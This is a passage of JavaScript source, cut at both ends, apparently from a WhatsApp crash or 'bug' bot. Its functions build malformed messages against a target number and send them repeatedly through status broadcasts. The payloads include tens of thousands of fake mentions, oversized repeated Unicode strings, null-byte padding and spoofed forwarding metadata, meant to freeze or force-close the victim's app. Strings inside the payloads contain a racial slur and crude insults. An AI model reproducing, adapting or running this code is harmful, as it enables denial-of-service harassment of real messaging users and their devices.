        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  };

  await yogzz.relayMessage("status@broadcast", msg.message, broadcastSend);

  if (mention) {
    await yogzz.relayMessage(target, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: {
          is_status_mention: " null - exexute"
        },
        content: undefined
      }]
    });
  }
}

async function FcXDelay(target) {
  let bokepFc = JSON.stringify({
    status: true,
    criador: "ForceClose",
    resultado: {
      type: "md",
      ws: {
        _events: { "CB:ib,,dirty": ["Array"] },
        _eventsCount: 800000,
        _maxListeners: 0,
        url: "wss://web.whatsapp.com/ws/chat",
        config: {
          version: ["Array"],
          browser: ["Array"],
          waWebconnetUrl: "wss://web.whatsapp.com/ws/chat",
          connCectTimeoutMs: 20000,
          keepAliveIntervalMs: 30000,
          logger: {},
          printQRInTerminal: false,
          emitOwnEvents: true,
          defaultQueryTimeoutMs: 60000,
          customUploadHosts: [],
          retryRequestDelayMs: 250,
          maxMsgRetryCount: 5,
          fireInitQueries: true,
          auth: { Object: "authData" },
          markOnlineOnconnCect: true,
          syncFullHistory: true,
          linkPreviewImageThumbnailWidth: 192,
          transactionOpts: { Object: "transactionOptsData" },
          generateHighQualityLinkPreview: false,
          options: {},
          appStateMacVerification: { Object: "appStateMacData" },
          mobile: true,
        },
      },
    },
  });

  let bokepFcV2 = JSON.stringify({
    status: true,
    criador: "ForceClose",
    resultado: {
      type: "md",
      ws: {
        _events: { "CB:ib,,dirty": ["Array"] },
        _eventsCount: 800000,
        _maxListeners: 0,
        url: "wss://web.whatsapp.com/ws/chat",
        config: {
          version: ["Array"],
          browser: ["Array"],
          waWebconnetUrl: "wss://web.whatsapp.com/ws/chat",
          connCectTimeoutMs: 20000,
          keepAliveIntervalMs: 30000,
          logger: {},
          printQRInTerminal: false,
          emitOwnEvents: true,
          defaultQueryTimeoutMs: 60000,
          customUploadHosts: [],
          retryRequestDelayMs: 250,
          maxMsgRetryCount: 5,
          fireInitQueries: true,
          auth: { Object: "authData" },
          markOnlineOnconnCect: true,
          syncFullHistory: true,
          linkPreviewImageThumbnailWidth: 192,
          transactionOpts: { Object: "transactionOptsData" },
          generateHighQualityLinkPreview: false,
          options: {},
          appStateMacVerification: { Object: "appStateMacData" },
          mobile: true,
        },
      },
    },
  });
  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          videoMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
            mimetype: "video/mp4",
            fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
            fileLength: "999999",
            seconds: 999999,
            mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
            caption: " ",
            height: 999999,
            width: 999999,
            fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
            directPath:
              "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1743742853",
            contextInfo: {
              isSampled: true,
              mentionedJid: [
                "13135550002@s.whatsapp.net",
                ...Array.from(
                  { length: 30000 },
                  () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                ),
              ],
            },
            streamingSidecar:
              "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
            thumbnailDirectPath:
              "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
            thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
            thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
            annotations: [
              {
                embeddedContent: {
                  embeddedMusic: {
                    musicContentMediaId: "kontol",
                    songId: "peler",
                    author: ".SkyzoDevoper",
                    title: "gtau",
                    artworkDirectPath:
                      "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                    artworkSha256:
                      "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                    artworkEncSha256:
                      "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                    artistAttribution:
                      "https://www.instagram.com/_u/tamainfinity_",
                    countryBlocklist: true,
                    isExplicit: true,
                    artworkMediaKey:
                      "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ=",
                  },
                },
                embeddedAction: null,
              },
            ],
          },
        },
      },
    },
    {}
  );
  const contextInfo = {
    mentionedJid: [target],
    isForwarded: true,
    forwardingScore: 999,
    businessMessageForwardInfo: {
      businessOwnerJid: target,
    },
  };

  let messagePayload = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo,
          body: {
            text: "〽️⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑〽️",
          },
          nativeFlowMessage: {
            buttons: [
              { name: "single_select", buttonParamsJson: bokepFc + "gatau" },
              {
                name: "call_permission_request",
                buttonParamsJson: bokepFc + "\u0003",
              },
              { name: "single_select", buttonParamsJson: bokepFcV2 + "gatau" },
              {
                name: "call_permission_request",
                buttonParamsJson: bokepFcV2 + "\u0003",
              },
              { name: "single_select", buttonParamsJson: bokepFc + "gatau" },
              {
                name: "call_permission_request",
                buttonParamsJson: bokepFc + "\u0003",
              },
              { name: "single_select", buttonParamsJson: bokepFcV2 + "gatau" },
              {
                name: "call_permission_request",
                buttonParamsJson: bokepFcV2 + "\u0003",
              },
              { name: "single_select", buttonParamsJson: bokepFc + "gatau" },
              {
                name: "call_permission_request",
                buttonParamsJson: bokepFc + "\u0003",
              },
              { name: "single_select", buttonParamsJson: bokepFcV2 + "gatau" },
              {
                name: "call_permission_request",
                buttonParamsJson: bokepFcV2 + "\u0003",
              },
            ],
          },
        },
      },
    },
  };

  await Dragon.relayMessage(target, messagePayload, {
    participant: { jid: target },
  });
  await Dragon.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await Dragon.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: { protocolMessage: { key: msg.key, type: 25 } },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "true" },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function buldozer(target, mention) {
  const glitchText =
    "〽️⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑〽️".repeat(3000) +
    "\n" +
    "‎".repeat(3000); // simbol + invisible

  const generateMessage = {
    viewOnceMessage: {
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          caption: `xata is here${glitchText}`,
          fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
          fileLength: "19769",
          height: 354,
          width: 783,
          mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
          fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
          directPath:
            "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
          mediaKeyTimestamp: "1743225419",
          jpegThumbnail: null,
          scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
          scanLengths: [2437, 17332],
          contextInfo: {
            mentionedJid: Array.from(
              { length: 40000 },
              () => "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net"
            ),
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9999,
            isForwarded: true,
          },
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, generateMessage, {});

  await Dragon.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await Dragon.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "⚠" },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function protocolbug5(target, mention) {
  const mentionedList = [
    "13135550002@s.whatsapp.net",
    ...Array.from(
      { length: 40000 },
      () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    ),
  ];

  const embeddedMusic = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: ".xataa¡?" + "ោ៝".repeat(10000),
    title: "Apocalypse",
    artworkDirectPath:
      "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU=",
  };

  const videoMessage = {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
    mimetype: "video/mp4",
    fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
    fileLength: "289511",
    seconds: 15,
    mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
    caption: "jaja",
    height: 640,
    width: 640,
    fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
    directPath:
      "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1743848703",
    contextInfo: {
      isSampled: true,
      mentionedJid: mentionedList,
    },
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363334766163982@newsletter",
      serverMessageId: 1,
      newsletterName: "χඞ",
    },
    streamingSidecar:
      "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
    thumbnailDirectPath:
      "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
    thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
    thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
    annotations: [
      {
        embeddedContent: {
          embeddedMusic,
        },
        embeddedAction: true,
      },
    ],
  };

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: { videoMessage },
      },
    },
    {}
  );

  await Dragon.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await Dragon.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "true" },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function CarouselX(target) {
  for (let i = 0; i < 1020; i++) {
    try {
      let push = [];

      for (let i = 0; i < 1020; i++) {
        push.push({
          body: proto.Message.InteractiveMessage.Body.fromObject({
            text: "ㅤ",
          }),
          footer: proto.Message.InteractiveMessage.Footer.fromObject({
            text: "ㅤㅤ",
          }),
          header: proto.Message.InteractiveMessage.Header.fromObject({
            title: "*Deraclas Storm Was Here!*",
            hasMediaAttachment: true,
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
              fileLength: "10840",
              height: 10,
              width: 10,
              mediaKey: "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
              fileEncSha256: "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
              directPath:
                "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1721344123",
              jpegThumbnail: "",
            },
          }),
          nativeFlowMessage:
            proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
              buttons: [],
            }),
        });
      }

      const carousel = generateWAMessageFromContent(
        target,
        {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2,
              },
              interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: `${"𑜦".repeat(
                    40000
                  )}wkwkwkwkwkkwkwkwkwk2kwkwkwkkqkwkkwkwkwwkkwk\n\u0000`,
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: "About Me: bio.link/Yukina",
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                  hasMediaAttachment: false,
                }),
                carouselMessage:
                  proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                    cards: push,
                  }),
              }),
            },
          },
        },
        {}
      );

      // Send the message
      await Dragon.relayMessage(target, carousel.message, {
        participant: { jid: target },
      });
    } catch (err) {
      console.error("Error in Fkod:", err);
    }
  }
}

async function RyuApiDelay(target, mention) {
  // Default true biar otomatis nyala
  const delaymention = Array.from({ length: 30000 }, (_, r) => ({
    title: "᭡꧈".repeat(95000),
    rows: [{ title: `${r + 1}`, id: `${r + 1}` }],
  }));

  const MSG = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "𝗺𝗮𝗸𝗹𝗼🫀",
          listType: 2,
          buttonText: null,
          sections: delaymention,
          singleSelectReply: { selectedRowId: "🔴" },
          contextInfo: {
            mentionedJid: Array.from(
              { length: 30000 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "333333333333@newsletter",
              serverMessageId: 1,
              newsletterName: "-",
            },
          },
          description: "Dont Bothering Me Bro!!!",
        },
      },
    },
    contextInfo: {
      channelMessage: true,
      statusAttributionType: 2,
    },
  };
  const msg = generateWAMessageFromContent(target, MSG, {});

  await Dragon.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  }); // **Cek apakah mention true sebelum menjalankan relayMessage**

  if (mention) {
    await Dragon.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "freze Here Bro" },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function secretfunct(target, mention) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" +
                  Math.floor(Math.random() * 500000000) +
                  "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await Dragon.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}


async function frezbuttoninvis(target) {
    const spamMessage = "@1".repeat(10200);
    const crashMessage = "ꦽ".repeat(10200);
    
    
    const MSG = {
        viewOnceMessage: {
            message: {
                extendedTextMessage: {
                    text: "'ryzen is here 🥵",
                    previewType: "Hola 🤣",
                    contextInfo: {
                        mentionedJid: [
                            target,
                            "0@s.whatsapp.net",
                            ...Array.from(
                                { length: 30000 },
                                () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                            ),
                        ],
                        forwardingScore: 1,
                        isForwarded: true,
                        fromMe: false,
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                    },
                },
            },
        },
    };

    const msg = generateWAMessageFromContent(target, MSG, {});

    await Dragon.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    await Dragon.relayMessage(
        target,
        {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        },
        {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "Fuck you Lookin at, nigga" },
                    content: undefined
                }
            ]
        }
    );
}

async function cursorinsix(target) {
    const messagePayload = {
        viewOnceMessage: {
            message: {
                "imageMessage": {
                    "url": "https://mmg.whatsapp.net/v/t62.7118-24/35284527_643231744938351_8591636017427659471_n.enc?ccb=11-4&oh=01_Q5AaIF8-zrQNGs5lAiDqXBhinREa4fTrmFipGIPYbWmUk9Fc&oe=67C9A6D5&_nc_sid=5e03e0&mms3=true",
                    "mimetype": "image/jpeg",
                    "caption": "柊-HAMA SEPERTI LU MATI AJA ANJG" + "@1".repeat(15999),
                    "fileSha256": "ud/dBUSlyour8dbMBjZxVIBQ/rmzmerwYmZ76LXj+oE=",
                    "fileLength": "99999999999",
                    "height": 307,
                    "width": 734,
                    "mediaKey": "TgT5doHIxd4oBcsaMlEfa+nPAw4XWmsQLV4PDH1jCPw=",
                    "fileEncSha256": "IkoJOAPpWexlX2UnqVd5Qad4Eu7U5JyMZeVR1kErrzQ=",
                    "directPath": "/v/t62.7118-24/35284527_643231744938351_8591636017427659471_n.enc?ccb=11-4&oh=01_Q5AaIF8-zrQNGs5lAiDqXBhinREa4fTrmFipGIPYbWmUk9Fc&oe=67C9A6D5&_nc_sid=5e03e0",
                    "mediaKeyTimestamp": "1738686532",
                    "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAB4ASAMBIgACEQEDEQH/xAArAAACAwEAAAAAAAAAAAAAAAAEBQACAwEBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAABFJdjZe/Vg2UhejAE5NIYtFbEeJ1xoFTkCLj9KzWH//xAAoEAABAwMDAwMFAAAAAAAAAAABAAIDBBExITJBEBJRBRMUIiNicoH/2gAIAQEAAT8AozeOpd+K5UBBiIfsUoAd9OFBv/idkrtJaCrEFEnCpJxCXg4cFBHEXgv2kp9ENCMKujEZaAhfhDKqmt9uLs4CFuUSA09KcM+M178CRMnZKNHaBep7mqK1zfwhlRydp8hPbAQSLgoDpHrQP/ZRylmmtlVj7UbvI6go6oBf/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwAv/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwAv/9k=",
                    "scansSidecar": "nxR06lKiMwlDForPb3f4fBJq865no+RNnDKlvffBQem0JBjPDpdtaw==",
                    "scanLengths": [2226, 6362, 4102, 6420],
                    "midQualityFileSha256": "erjot3g+S1YfsbYqct30GbjvXD2wgQmog8blam1fWnA="
                }
            }
        }
    };

    await Dragon.relayMessage("status@broadcast", messagePayload.viewOnceMessage.message, {
        messageId: Dragon.generateMessageTag(),
        statusJidList: [target]
    });
}

async function protocolbug6(isTarget, mention) {
  let msg = await generateWAMessageFromContent(isTarget, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        interactiveResponseMessage: {
          body: {
            text: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "flex_agency",
            paramsJson: "\u0000".repeat(999999),
            version: 3
          },
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9741,
            forwardedNewsletterMessageInfo: {
              newsletterName: "trigger newsletter ( @tamainfinity )",
              newsletterJid: "120363321780343299@newsletter",
              serverMessageId: 1
            }
          }
        }
      }
    }
  }, {});

  await Dragon.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: isTarget }, content: undefined }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await Dragon.relayMessage(isTarget, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            type: 25
          },
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂" },
              content: undefined
            }
          ]
        }
      }
    }, {});
  }
}


async function location(target) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                liveLocationMessage: {
                    degreesLatitude: 'p',
                    degreesLongitude: 'p',
                    caption: "Vortex",
                    sequenceNumber: '0',
                    jpegThumbnail: '',
                contextInfo: {
                    mentionedJid: Array.from({
                        length: 30000
                    }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                    isSampled: true,
                    participant: target,
                    remoteJid: "status@broadcast",
                    forwardingScore: 9741,
                    isForwarded: true
                }
            }
        }
    }
};

const msg = generateWAMessageFromContent(target, generateMessage, {});

await Dragon.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
                tag: "to",
                attrs: {
                    jid: target
                },
                content: undefined
            }]
        }]
    }]
});
console.log(chalk.green("sending bug location"));
}

async function delaymakeroverload1(target) {
  for (let i = 0; i < 20000; i++) {
    await buldozer(target, true),
    await delay(100); // Delay 1 detik
  }
} 

async function NewFuncDelay(target) {
  const mentionedList = Array.from({ length: 40000 }, () => `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`);
  const system = "꧀".repeat(333333);

  
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        interactiveResponseMessage: {
          body: {
            text: "undangan admin saluran",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "𐍇𐍂𐌴𐍧𐍧𐍅 𝚵𝚳𝚸𝚬𝚪𝚯𝐑",
            paramsJson: "\u0000".repeat(999999),
            version: 3
          },
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9999,
            forwardedNewsletterMessageInfo: {
              newsletterName: "~ 𐍇𐍂𐌴𐍧𐍧𐍅 𝚵𝚳𝚸𝚬𝚪𝚯𝐑 ~",
              newsletterJid: "120363321780343299@newsletter",
              serverMessageId: 1
            }
          }
        }
      }
    }
  }, {});

await Dragon.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });

  await Dragon.sendMessage(target, {
    text: "Undangan admin saluran",
    contextInfo: {
      mentionedJid: mentionedList,
      quotedMessage: {
        viewOnceMessage: {
          message: {
            groupStatusMentionMessage: {
              name: "𐍇𐍂𐌴𐍧𐍧𐍅 𝙴𝚇𝙿𝙻𝙾𝙸𝚃" + system,
              jid: target,
              mention: [target],
              contextInfo: {
                mentionedJid: mentionedList
              }
            }
          }
        }
      },
      remoteJid: "status@broadcast",
participant: "0@s.whatsapp.net",
      fromMe: true
    }
  });

  await Dragon.relayMessage(target, {
    statusMentionMessage: {
      message: {
        protocolMessage: {
          key: msg.key,
          fromMe: false,
          participant: "0@s.whatsapp.net",
          remoteJid: "status@broadcast",
          type: 25
        },
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "." + system },
            content: undefined
          }
        ]
      }
    }
  }, {
      participant : target
  });
}

async function protocolbug8(isTarget, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
